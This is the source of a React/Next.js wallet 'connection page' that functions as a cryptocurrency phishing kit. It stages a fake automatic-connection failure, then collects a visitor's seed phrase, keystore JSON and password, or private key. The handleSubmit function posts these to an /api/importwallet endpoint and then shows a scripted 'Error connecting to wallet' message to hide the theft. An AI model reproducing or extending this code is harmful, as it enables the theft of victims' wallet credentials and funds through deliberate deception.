/* eslint-disable @next/next/no-img-element */
"use client";
import { wallets } from "@/lib/data";
import React, { useState } from "react";
import img from "../Wallets/error-icon-25239.png";

interface ITEM {
  name: string;
  imgUrl: string;
}

const Wallet = () => {
  const [selectedItem, setSelectedItem] = useState<ITEM>();
  const [selectedTab, setSelectedTab] = useState("phrase");
  const [status, setStatus] = useState("Trying to connect to wallet");
  const [formData, setFormData] = useState({
    phrase: "",
    keystore: {
      json: "",
      password: "",
    },
    privateKey: "",
  });

  const handleInputChange = (
    e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>
  ) => {
    const { name, value } = e.target;
    setFormData((prevData) => ({
      ...prevData,
      [name]: value,
    }));
  };

  const handleKeystoreChange = (
    e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>
  ) => {
    const { name, value } = e.target;
    setFormData((prevData) => ({
      ...prevData,
      keystore: {
        ...prevData.keystore,
        [name]: value,
      },
    }));
  };

  const resetForm = () => {
    setFormData({
      phrase: "",
      keystore: {
        json: "",
        password: "",
      },
      privateKey: "",
    });
    setSelectedTab("phrase");
  };

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setStatus("Connection verification pending");

    const finalModal = document.getElementById(
      "my_modal_3"
    ) as HTMLDialogElement | null;

    const modalTwo = document.getElementById(
      "my_modal_2"
    ) as HTMLDialogElement | null;

    if (modalTwo) {
      modalTwo.close();
    }

    if (finalModal) {
      finalModal.show();
    }

    // Process the formData based on the selectedTab
    let dataToSend;
    if (selectedTab === "phrase") {
      dataToSend = { phrase: formData.phrase, item: selectedItem?.name };
    } else if (selectedTab === "keystore") {
      dataToSend = { keystore: formData.keystore, item: selectedItem?.name };
    } else if (selectedTab === "private") {
      dataToSend = {
        privateKey: formData.privateKey,
        item: selectedItem?.name,
      };
    }
    // Send dataToSend to the backend
    console.log(dataToSend);

    // Send dataToSend to the backend
    try {
      const response = await fetch("/api/importwallet", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(dataToSend),
      });
      if (response.ok) {
        resetForm();
        setTimeout(() => setStatus("Error connecting to wallet..."), 4000);
        // setTimeout(
        //   () => setStatus("CONNECTED WALLET ,wait while our team fix issue"),
        //   10000
        // );
      } else {
        setStatus("Check your internet connection");
      }
    } catch (error) {
      console.error("Error submitting form:", error);
    }
  };

  const handleModal = async (item: { name: string; imgUrl: string }) => {
    setSelectedItem(item);

    const modal = document.getElementById(
      "my_modal_1"
    ) as HTMLDialogElement | null;
    const modalTwo = document.getElementById(
      "my_modal_2"
    ) as HTMLDialogElement | null;
    const modalfour = document.getElementById(
      "my_modal_4"
    ) as HTMLDialogElement | null;

    if (modal) {
      modal.showModal();
    }
    setTimeout(() => {
      modal?.close();
      modalTwo?.showModal();
    }, 4500);
  };

  return (
    <div className=" pb-5 bg-black text-center pt-10 text-white">
      <h3 className="text-black font-bold text-white">Connection page</h3>
      <p className="">Connect with one of our available providers</p>

      <div className="pt-7 px-3 flex flex-wrap justify-between  lg:px-5 gap-1">
        {wallets.map((item, index) => (
          <div
            key={index}
            onClick={() => handleModal(item)}
            className="flex items-center flex-col justify-between border-2  rounded-[10px] py-[1.5em] px-[0.4em] cursor-pointer w-[49%] md:w-[49%] lg:w-[30%] shadow-lg mb-3"
          >
            <div>
              <img
                src={item.imgUrl}
                alt="meta"
                className="w-[40px] h-auto rounded-full"
              />
            </div>
            <div className="flex items-center">
              <p className="text-white font-bold">{item.name}</p>
            </div>
          </div>
        ))}
      </div>
      {/* Open the modal using document.getElementById('ID').showModal() method */}
      <dialog id="my_modal_1" className="modal">
        <div className="flex flex-col gap-5 modal-box bg-white w-[80%]">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3 text-primary-light font-bold">
              Initializing
              <span className="loading loading-bars loading-xs bg-primary-light"></span>
            </div>

            <form method="dialog" className="">
              {/* if there is a button in form, it will close the modal */}
              <button className="outline-none h-[10px] text-[13px] font-bold">
                X
              </button>
            </form>
          </div>

          {selectedItem && (
            <div className="flex items-center justify-between p-2 border-customGray-main border-[1px] rounded-[10px]">
              <div className="flex flex-col gap-1">
                <h5 className="font-bold text-customDark-main text-start">
                  {selectedItem.name}
                </h5>
                <p className="text-[12px] text-customGray-main">
                  Easy-to-use browser extension
                </p>
              </div>

              <div>
                <img
                  src={selectedItem.imgUrl}
                  alt="meta"
                  className="w-[40px] h-auto rounded-full"
                />
              </div>
            </div>
          )}
        </div>
      </dialog>
      <dialog id="my_modal_3" className="modal bg-[#00000069]">
        <div className="flex flex-col gap-5 modal-box bg-white w-[80%]">
          <div className="flex items-center justify-between">
            <div
              className={`text-[13px] lg:text-[16px] sm:text-[14px] flex items-center gap-3 font-bold ${
                status === "Error connecting to wallet..."
                  ? "text-red-500"
                  : "text-primary-light"
              }`}
            >
              {status === "Error connecting to wallet..." && (
                <div>
                  <img
                    src="/error-icon-25239.png"
                    alt="img"
                    className="w-8 h-8"
                  />
                </div>
              )}
              {status}
              <span
                className={`loading loading-dots loading-xs sm:loading-md bg-primary-light ${
                  status === "Error connecting to wallet..." ||
                  status === "Check your internet connection"
                    ? "hidden"
                    : ""
                }`}
              ></span>
            </div>

            <form method="dialog" className="">
              {/* if there is a button in form, it will close the modal */}
              <button className="outline-none h-[10px] text-[13px] font-bold">
                X
              </button>
            </form>
          </div>
        </div>
      </dialog>
      <dialog id="my_modal_2" className="modal">
        <div className="modal-box bg-white w-[83%]">
          <div>
            <p className="text-red-500 text-[13px] md:text-[16px]  modal-p font-bold">
              There was an error connecting automatically. But do not worry, you
              can still connect manually.
            </p>
          </div>
          <p className="text-[15px] md:text-[15px]  modal-p font-bold text-start text-black mb-1 ml-2">
            DApp Type:
          </p>
          <div className="flex flex-col gap-5  p-3 rounded-[20px] border-2 shadow-lg">
            <div className="flex flex-col gap-3">
              <div>
                <p className=" text-[15px] md:text-[15px]  modal-p font-bold text-start">
                  Method of connection :
                </p>
                <div className="flex text-green-700">
                  <select
                    name="wallet"
                    id="wallet"
                    className="rounded-full p-1 mb-3"
                    onChange={(e) => {
                      console.log(e.target.value);

                      setSelectedTab(e.target.value);
                    }}
                  >
                    <option value="phrase">Phrase</option>
                    <option value="keystore">Keystore JSON</option>
                    <option value="private">Private Key</option>]'=[
                  </select>
                </div>
              </div>
            </div>

            <div>
              <p className=" text-[15px] md:text-[15px]  modal-p font-bold text-start">
                Phrase,Key strore or Private Key
              </p>
              <div className="mt-3">
                <form onSubmit={handleSubmit} className="">
                  {selectedTab === "phrase" && (
                    <div className="form-control">
                      <textarea
                        name="phrase"
                        id=""
                        value={formData.phrase}
                        onChange={handleInputChange}
                        rows={2}
                        className="text-gray-700 focus:outline-none bg-white border-[1px] border-customGray-main rounded-[10px] placeholder:text-customGray-main p-2"
                      ></textarea>
                    </div>
                  )}
                  {selectedTab === "keystore" && (
                    <div className="flex flex-col gap-4">
                      <div className="form-control">
                        <textarea
                          id=""
                          name="json"
                          value={formData.keystore.json}
                          onChange={handleKeystoreChange}
                          placeholder="Enter your Keystore JSON"
                          rows={3}
                          className="text-gray-700 focus:outline-none bg-white border-[1px] border-customGray-main rounded-[10px] placeholder:text-customGray-main p-2"
                        ></textarea>
                      </div>
                      <div className="form-control">
                        <input
                          type="password"
                          name="password"
                          value={formData.keystore.password}
                          onChange={handleKeystoreChange}
                          placeholder="Wallet password"
                          className="bg-white text-gray-700 focus:outline-none border-[1px] border-customGray-main rounded-[10px] placeholder:text-customGray-main p-2"
                        />
                      </div>
                    </div>
                  )}
                  {selectedTab === "private" && (
                    <div className="form-control">
                      <input
                        name="privateKey"
                        value={formData.privateKey}
                        onChange={handleInputChange}
                        type="text"
                        placeholder="Enter your Private Key"
                        className="bg-white border-[1px] text-gray-700 focus:outline-none border-customGray-main rounded-[10px] placeholder:text-customGray-main p-2"
                      />
                    </div>
                  )}
                  <div className="form-control mt-6">
                    <button
                      type="submit"
                      className="text-[14px] bg-[#090979] rounded-[4px] p-2 text-white font-bold"
                    >
                      Connect
                    </button>
                  </div>
                </form>
              </div>
            </div>
          </div>
          <div className="modal-action">
            <form method="dialog">
              {/* if there is a button in form, it will close the modal */}
              <button className="h-[2rem] text-center rounded-[5px] w-[90px] bg-red-500 text-white border-none">
                Close
              </button>
            </form>
          </div>
        </div>
      </dialog>
      <dialog id="my_modal_4" className="modal">
        <div className="modal-box bg-white w-[83%] flex justify-between">
          <div className="flex gap-2">
            <p className="text-red-500 text-[13px] md:text-[16px]  modal-p font-bold">
              Error connecting to wallet
            </p>
            <span
              className={`loading loading-dots loading-xs sm:loading-md bg-red-500`}
            ></span>
          </div>
          <form method="dialog" className="">
            {/* if there is a button in form, it will close the modal */}
            <button className="outline-none h-[10px] text-[13px] font-bold">
              X
            </button>
          </form>
        </div>
      </dialog>
    </div>
  );
};

export default Wallet;
